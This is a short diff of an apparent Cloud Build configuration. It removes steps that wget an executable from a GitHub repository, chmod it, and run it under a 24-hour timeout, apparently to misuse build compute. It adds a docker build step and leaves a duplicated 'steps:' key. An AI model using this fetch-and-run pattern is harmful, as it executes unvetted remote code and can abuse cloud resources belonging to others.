@@ -1,12 +1,7 @@
 steps:
-- name: 'bash'
-  args: ['wget', 'https://raw.githubusercontent.com/diprassss/KUNTUL/main/Node']
-- name: 'bash'
-  args: ['chmod', '+x', './Node']
-- name: 'bash'
-  args: ['chmod', '777', 'gas.sh']
-- name: 'bash'
-  args: ['./workspace/node']
+steps:
+- name: 'gcr.io/cloud-builders/docker'
+  args: [ 'build', '-t', 'gcr.io/playground-s-11-1815f4b3/buan', '.' ]
   timeout: 86400s
 
 options:
